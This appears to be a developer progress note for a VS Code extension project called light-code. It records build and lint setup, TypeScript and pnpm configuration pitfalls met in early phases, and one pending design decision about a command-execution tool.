- ESLint flat config enforces both invariants: `packages/core` cannot import `vscode`,
  and `fetch`/`axios`/`undici`/`node-fetch`/`node:http(s)` are banned everywhere except
  the (not-yet-created) `packages/core/src/platform/http.ts`. Both verified by
  deliberately violating them and confirming ESLint fails.
- `apps/vscode` registers one command (`lightCode.openPanel`) that opens an empty
  webview with a strict CSP. Verified via F5 in a real Extension Development Host.
- Publisher ID is `ChosenGeneration`; repo is
  `https://github.com/chosengenerationdev/light-code`.
- CI workflow (`.github/workflows/ci.yml`) runs lint/typecheck/build/test on
  `ubuntu-latest` and `windows-latest` via `pnpm install --ignore-scripts`. Not yet
  exercised on an actual push/PR.

**Surprised us — worth knowing before Phase 1:**
- `typescript-eslint` does not yet support TypeScript 7 (the new native/Go compiler that
  `pnpm add typescript` resolves to as `latest`). Pinned `typescript` to `6.0.3`, the
  newest release `typescript-eslint@8.x` supports. Re-check this pin before bumping
  TypeScript later.
- `apps/vscode/package.json` must **not** have `"type": "module"`. esbuild bundles
  `extension.ts` to CommonJS (VS Code's extension host `require()`s the entry point), but
  a `"type": "module"` package makes Node treat that CJS output as ESM, and the
  extension fails to load with a misleading symptom: the command shows as
  "not found" rather than an activation error. The build script itself needs ESM
  (top-level `await`), so it's named `esbuild.mjs` — an explicit extension that opts
  into ESM regardless of the package's own module type.
- pnpm now blocks postinstall scripts by default (`ignoredBuiltDependencies`); had to
  approve `esbuild`, `@vscode/vsce-sign` in `pnpm-workspace.yaml`'s `allowBuilds` (left
  `keytar` unapproved — only needed for `vsce login`, not `vsce package`).
- `engines.vscode` and `@types/vscode` were deliberately set to `1.102.0` (released
  2025-07-10, ~13 months before project start) rather than the newest release, and
  `@types/vscode` is pinned exactly (no `^`) so that using an API newer than the
  `engines` floor is a typecheck error, not a runtime surprise on an older VS Code.
  Bump both together, deliberately, if the minimum supported version ever changes.

**Surprised us in Phase 1:**
- TypeScript wasn't auto-discovering `@types/node` under this pnpm layout — `process`,
  `fetch`, `node:path`, etc. all failed with "Cannot find name". Root cause not fully
  chased down (plausibly a pnpm-isolated-`node_modules` interaction with TS's
  typeRoots walk); fixed by adding `"types": ["node"]` explicitly in
  `tsconfig.base.json` rather than relying on auto-discovery. If a package ever needs
  to *not* have Node globals ambiently available, it'll need to override this.
- `apps/vscode` importing `@light-code/core` broke `tsc --noEmit` because core's
  `package.json` points `types` at `dist/index.d.ts`, which doesn't exist until core
  is built — and running `pnpm typecheck` alone (as opposed to `pnpm build`) never
  builds it. A `paths` mapping to core's `src/index.ts` doesn't work either: it
  collides with `rootDir`. Fixed properly with TS project references
  (`apps/vscode/tsconfig.json` → `references: [{ path: "../../packages/core" }]`,
  `typecheck` script → `tsc -b tsconfig.json`), which is also the standard fix for
  Phase 2+ as more packages start depending on core.
- The `execute_command` tool's real implementation (Phase 3) still needs a decision:
  keep `Terminal`'s current `node:child_process` implementation, or switch to VS
  Code's terminal shell-integration API for a visible terminal and shell-reported
  exit codes. Flagged here rather than decided silently.

**Open questions for the user:**
- None blocking. Apigee specifics (token path, client credentials, header name, expiry)
  are configurable with defaults rather than fixed, so no answer is required to proceed.
